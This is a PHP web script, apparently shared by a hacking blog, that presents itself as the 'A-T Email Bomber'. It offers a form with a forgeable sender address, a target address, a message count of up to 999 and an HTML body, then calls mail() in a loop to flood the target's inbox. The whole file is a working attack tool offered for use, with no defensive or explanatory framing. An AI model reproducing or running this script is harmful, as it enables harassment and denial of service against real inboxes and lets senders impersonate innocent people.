<center><img src="http://i55.tinypic.com/2vweqe9.jpg" width="550" height="100" /><br></center>
<?php
    print "<title>A-T Email Bomber</title>";
    print "<body text='red' bgcolor='#000000'>";
    print "<center>";
    print "<b>Adnan Tahir Creation.... visit 4 more stuff www.hackingb0x.blogspot.com</b>";  
    print "<form action=".$_SERVER['PHP_SELF']." method='post'>";
    print "From:<br>";
    print "<input type='text' name='from' size='30' value='a@b.com'><br>";
    print "To:<br>";
    print "<input type='text' name='to' size='30' value='c@d.com'><br>";
    print "Amount:<br>";
    print "<input type='text' name='amount' size='3' maxlength='3' value='100'><br>";
    print "Subject:<br>";
    print "<input type='text' name='subject' size='30'><br>";
    print "Body (html format):<br>";
    print "<textarea name='body' rows='8' cols='35'></textarea><br><br>";
    print "<input type='submit' name='submit' value='submit'><br>";
    print "</form>";

    print "<br>";
    if (isset($_POST['submit']))
    {
       echo " ";
        $mail_from=$_POST["from"];
        $mail_to=$_POST["to"];
        $times = $_REQUEST['amount'];
       if(!is_numeric($times)) {echo "Invalid value for 'Amount'.<br><a href='javascript:history.go(-1)'>back</a>";exit;}
        $mail_subject=$_POST["subject"];
        $mail_body=$_POST["body"];
        $mail_headers=implode("\n",array("From: $mail_from","Subject: $mail_subject","Return-Path: $mail_from","MIME-Version: 1.0?","X-Priority: 3","Content-Type: text/html" ));
       //header("Content-Type: text/plain");
    $count = 1;
    while($count <= $times) {
        $status=mail($mail_to,$mail_subject,$mail_body,$mail_headers);
    ++$count;
    }
    if($status)
        {
            echo "<b>Sent !<b><br><br>";
        }
        else
        {
            echo "Failed<br><br>";
        }

        //exit;
    }
    //include("xvk98.php");
    print "</center></body>";
    //fuajuar


    ?>
<br>
<br>
<br>
<br>
<br>
<center><?php

?></center>